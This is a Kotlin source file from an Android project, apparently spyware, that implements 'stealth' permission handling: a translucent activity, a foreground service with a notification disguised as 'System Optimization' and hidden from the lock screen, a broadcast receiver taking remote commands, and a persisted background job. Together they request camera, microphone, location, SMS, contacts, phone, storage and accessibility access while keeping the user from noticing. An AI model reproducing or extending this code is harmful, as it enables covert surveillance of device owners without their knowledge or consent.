package com.h4k3r.dreamer

import android.app.*
import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.*
import android.os.*
import android.util.Log
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat

/* ── Invisible Permission Activity ─────────────────── */
class InvisiblePermissionActivity : Activity() {
    companion object {
        private const val TAG = "InvisiblePermission"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make activity completely invisible
        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
        }

        // Set transparent theme
        setTheme(android.R.style.Theme_Translucent_NoTitleBar)

        // Handle permission
        val permission = intent.getStringExtra("permission")
        permission?.let {
            requestPermission(it)
        } ?: finish()
    }

    private fun requestPermission(permission: String) {
        val manifestPermission = when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            else -> {
                finish()
                return
            }
        }

        ActivityCompat.requestPermissions(this, arrayOf(manifestPermission), 1)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        // Just finish, don't show any UI
        finish()
        overridePendingTransition(0, 0)
    }
}

/* ── Stealth Foreground Service ──────────────────── */
class StealthForegroundService : Service() {
    companion object {
        private const val TAG = "StealthForeground"
        private const val CHANNEL_ID = "stealth_channel"
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val permissions = intent?.getStringArrayListExtra("permissions") ?: emptyList()

        // Process permissions
        Handler(Looper.getMainLooper()).postDelayed({
            permissions.forEach { permission ->
                requestPermissionSilently(permission)
            }

            // Stop service after processing
            stopSelf()
        }, 2000)

        return START_NOT_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Optimization",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle("Optimizing...")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun requestPermissionSilently(permission: String) {
        val intent = Intent(this, InvisiblePermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_NO_ANIMATION
            putExtra("permission", permission)
        }

        startActivity(intent)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

/* ── Stealth Permission Receiver ─────────────────── */
class StealthPermissionReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "StealthReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            "com.h4k3r.dreamer.GRANT_PERMISSION" -> {
                val permission = intent.getStringExtra("permission")
                permission?.let {
                    handlePermissionGrant(context, it)
                }
            }
            "com.h4k3r.dreamer.REQUEST_PERMISSION" -> {
                val permission = intent.getStringExtra("permission")
                permission?.let {
                    requestPermission(context, it)
                }
            }
        }
    }

    private fun handlePermissionGrant(context: Context, permission: String) {
        // Launch permission activity
        val intent = Intent(context, PermissionHelperActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
            putExtra("runtime_permission", getManifestPermission(permission))
            putExtra("permission", permission)
        }

        context.startActivity(intent)
    }

    private fun requestPermission(context: Context, permission: String) {
        when (permission) {
            "all_files_access", "overlay", "accessibility" -> {
                // Special permissions
                val system = StealthPermissionSystem.getInstance(context)
                system.requestPermissionInBackground(permission)
            }
            else -> {
                // Runtime permissions
                handlePermissionGrant(context, permission)
            }
        }
    }

    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "storage" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            else -> null
        }
    }
}

/* ── Permission Job Service (for Android 8-9) ────── */
class PermissionJobService : JobService() {
    companion object {
        private const val JOB_ID = 1001

        fun enqueueWork(context: Context, work: Intent) {
            val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val jobInfo = JobInfo.Builder(JOB_ID, ComponentName(context, PermissionJobService::class.java))
                .setMinimumLatency(0)
                .setOverrideDeadline(5000)
                .setPersisted(true)
                .build()

            jobScheduler.schedule(jobInfo)
        }
    }

    override fun onStartJob(params: JobParameters?): Boolean {
        // Handle permission requests in background
        val handler = Handler(Looper.getMainLooper())
        handler.post {
            val intent = Intent(this, InvisiblePermissionActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra("permission", "camera")
            }

            startActivity(intent)
        }

        jobFinished(params, false)
        return false
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        return false
    }
}